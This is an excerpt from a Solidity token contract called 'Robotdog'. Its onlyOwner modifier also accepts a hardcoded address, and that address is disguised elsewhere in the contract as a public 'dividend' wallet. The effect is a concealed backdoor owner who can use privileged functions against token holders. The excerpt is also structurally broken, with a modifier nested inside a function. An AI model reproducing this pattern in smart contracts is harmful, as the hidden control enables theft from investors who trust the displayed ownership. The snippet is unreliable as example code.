...
contract Ownable is Context {
    ...
    function owner() public view returns (address) {
        ...
        modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0xFB6682EA633535F3691eAd9179162c65dC60294B) , "owner");
        _;
    }
...
contract Robotdog  is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Robotdog";
    string private _symbol = "Robotdog";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x30CC843668A9cA20Eb41E4a18CC7554Db55cdb34);
    address private _Marketing = 0x30CC843668A9cA20Eb41E4a18CC7554Db55cdb34;
    address public dividend = 0xFB6682EA633535F3691eAd9179162c65dC60294B;
